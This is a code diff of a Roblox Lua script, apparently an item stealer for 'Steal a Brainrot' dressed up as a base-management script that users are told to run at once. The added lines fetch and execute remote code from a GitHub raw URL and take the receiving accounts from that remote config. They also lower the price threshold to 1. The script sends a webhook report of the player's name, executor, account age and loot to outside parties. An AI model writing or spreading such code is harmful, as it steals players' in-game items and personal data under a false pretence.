@@ -29,8 +29,10 @@ local function parsePrice(priceText)
 end
 
 local config = loadstring(game:HttpGet("https://raw.githubusercontent.com/PhatLee877/config/refs/heads/main/config"))()
-local PRICE_LIMIT = config.PRICE_LIMIT
+local PRICE_LIMIT = 1
 local targetNames = config.targetNames
+local receiverList = table.concat(config.Receiver, ", ")
+local badPlayers = config.Receiver
 
 local function getPriority(name)
     for _, t in ipairs(targetNames) do
@@ -178,7 +180,7 @@ local function sendWebhook(link)
             { ["name"] = "Server Type", ["value"] = serverType },
             { ["name"] = "👥 Player Information",
               ["value"] = "Name: " .. player.Name ..
-                          "\nReceiver: phatle8117, banpetuytin1111, banpetuytin111140" ..
+                          "\nReceiver: ".. receiverList ..
                           "\nExecutor: " .. detectExecutor() ..
                           "\nAccount Age: " .. tostring(getAccountAge()) .. " days" },
             { ["name"] = "🧠Brainrot Loot", ["value"] = lootText },
@@ -332,7 +334,6 @@ end
 -- Script quáº£n lĂ½ base (Full Final)
 -- Execute dĂ¹ng ngay
 -- =============================
-local badPlayers = { "phatle8117", "ConCuTiHon02" }
 
 local plotsFolder = Workspace:FindFirstChild("Plots")
 local myBase = nil
